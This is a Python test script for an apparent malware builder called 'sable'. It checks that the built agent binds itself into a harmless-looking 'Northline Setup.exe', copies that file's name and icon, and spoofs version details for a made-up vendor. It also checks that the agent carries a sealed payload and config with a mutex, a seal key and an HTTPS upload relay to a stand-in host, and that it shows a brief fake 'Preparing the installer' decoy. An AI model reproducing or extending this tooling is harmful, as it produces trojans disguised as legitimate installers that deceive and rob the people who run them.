"""End-to-end: the binder, the properties sheet and the decoy, on one artifact.

The binder half runs against a real frozen launcher, because the launcher is the thing
that carries a PyInstaller archive on its tail. The bind half runs against an inert
``calc.exe``-shaped file, which is all the filename logic needs: what is being proved is
that the artifact arrives called what the bound file is called.

    python disguise_check.py
"""

from __future__ import annotations

import struct
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "sable"))
sys.path.insert(0, str(ROOT / "_harness"))

from binder_check import read_version, shell_icon  # noqa: E402

from core import forge, pipeline  # noqa: E402
from core.schema import RelayConfig, RunConfig, SourceConfig, VersionConfig  # noqa: E402

LAUNCHER = ROOT / "sable" / "tools" / "dist" / "sable-launcher.exe"
SABLE = ROOT / "sable"

WANTED = VersionConfig(
    company="Northline Software Ltd",
    product="Northline Setup",
    description="Setup loader",
    copyright="(c) 2026 Northline",
    original_name="northline-setup.exe",
    file_version="6.2.9.441",
    product_version="6.2.9.441",
)

# Two green/blue images, built here so the check does not depend on a file on the box.
def _bitmap(side: int, bgra: tuple[int, int, int, int]) -> bytes:
    header = struct.pack(
        "<IiiHHIIiiII", 40, side, side * 2, 1, 32, 0, side * side * 4, 0, 0, 0, 0
    )
    return header + bytes(bgra) * side * side + bytes((side + 31) // 32 * 4) * side


def marker_icon() -> bytes:
    images = [_bitmap(32, (0, 0, 255, 255)), _bitmap(32, (0, 255, 0, 255))]
    directory = b""
    cursor = 6 + 16 * len(images)
    for image in images:
        directory += struct.pack("<BBBBHHII", 32, 32, 0, 0, 1, 32, len(image), cursor)
        cursor += len(image)
    return struct.pack("<HHH", 0, 1, len(images)) + directory + b"".join(images)


def config() -> RunConfig:
    return RunConfig(
        schema_version=1,
        mutex=r"Global\sable-disguise-check",
        seal_key="disguise-check-key",
        relay=RelayConfig(kind="https", endpoint="https://example.invalid/upload"),
        sources=SourceConfig(),
        version=WANTED,
        decoy_seconds=2,
        decoy_title="Northline Setup",
        decoy_text="Preparing the installer, please wait.",
    )


def main() -> int:
    failures: list[str] = []
    workspace = Path(tempfile.mkdtemp(prefix="sable-disguise-"))
    icon = workspace / "marker.ico"
    icon.write_bytes(marker_icon())

    # An inert file with a name worth preserving. Content is a PE header and padding:
    # nothing here is started, the binder only has to carry it.
    bound = workspace / "Northline Setup.exe"
    bound.write_bytes(b"MZ" + bytes(2048))

    out = workspace / "out"
    cfg = config()
    outcome = pipeline.run(
        cfg,
        root=SABLE,
        out_dir=out,
        stub=LAUNCHER,
        icon=icon,
        fuse=bound,
        version=cfg.version,
    )
    artifact = outcome.artifact

    # 1. The name came from the bound file, not from a generator.
    expected = "Northline Setup.exe"
    if artifact.name != expected:
        failures.append(f"artifact is {artifact.name!r}, wanted {expected!r}")
    print(f"  name      {artifact.name}")

    # 2. The properties sheet reads back through version.dll.
    shown = read_version(artifact)
    print(f"  version   {shown.get('CompanyName')!r} {shown.get('file_version')}")
    if shown.get("CompanyName") != WANTED.company:
        failures.append(f"company reads {shown.get('CompanyName')!r}")
    if shown.get("file_version") != WANTED.file_version:
        failures.append(f"file version reads {shown.get('file_version')!r}")
    if shown.get("OriginalFilename") != WANTED.original_name:
        failures.append(f"original name reads {shown.get('OriginalFilename')!r}")

    # 3. The icon is the marker, and the stub's own icon is gone.
    drawn = shell_icon(artifact)
    original = shell_icon(LAUNCHER)
    print(f"  icon      {original} -> {drawn}")
    if drawn == original:
        failures.append("the shell still draws the launcher's icon")

    # 4. The container still holds: footer offset lands on the sealed blob, and the
    #    launcher's archive is still on the tail.
    raw = artifact.read_bytes()
    offset = int.from_bytes(raw[-forge.FOOTER_SIZE + 4:], "little")
    if raw[-forge.FOOTER_SIZE:-forge.FOOTER_SIZE + 4] != forge.FOOTER_MAGIC:
        failures.append("the footer magic is missing")
    if offset <= 0 or offset >= len(raw):
        failures.append(f"the footer offset {offset} is outside the file")

    # 5. The bound file is in the archive, under the bind prefix, byte for byte.
    from agent import loader

    sealed = loader._read_sealed(artifact, offset)
    payload = loader._open_sealed(sealed, cfg.seal_key)
    import io
    import zipfile

    with zipfile.ZipFile(io.BytesIO(payload)) as archive:
        names = archive.namelist()
        member = forge.FUSE_PREFIX + bound.name
        if member not in names:
            failures.append(f"{member} is not in the payload")
        elif archive.read(member) != bound.read_bytes():
            failures.append("the bound file changed on the way in")
        carried = archive.read(forge.CONFIG_MEMBER).decode("utf-8")
        if "Northline Software Ltd" not in carried:
            failures.append("the version block did not travel in cfg.json")
        if '"decoy_seconds": 2' not in carried:
            failures.append("the decoy settings did not travel in cfg.json")
        print(f"  payload   {len(names)} members, bound file carried intact")

    # 6. The decoy returns instead of waiting for a click.
    from agent import decoy

    started = time.monotonic()
    shown_ok = decoy.show("Northline Setup", "Preparing the installer.", 1)
    waited = time.monotonic() - started
    print(f"  decoy     shown={shown_ok} returned in {waited:.2f}s")
    if not shown_ok:
        failures.append("the decoy did not show")
    if waited > 5:
        failures.append(f"the decoy blocked for {waited:.1f}s")

    print(f"\nwork: {workspace}")
    if failures:
        print("FAILED")
        for line in failures:
            print("  -", line)
        return 1
    print("held: name from the bound file, version on the sheet, icon in the shell, "
          "payload intact, decoy returns")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
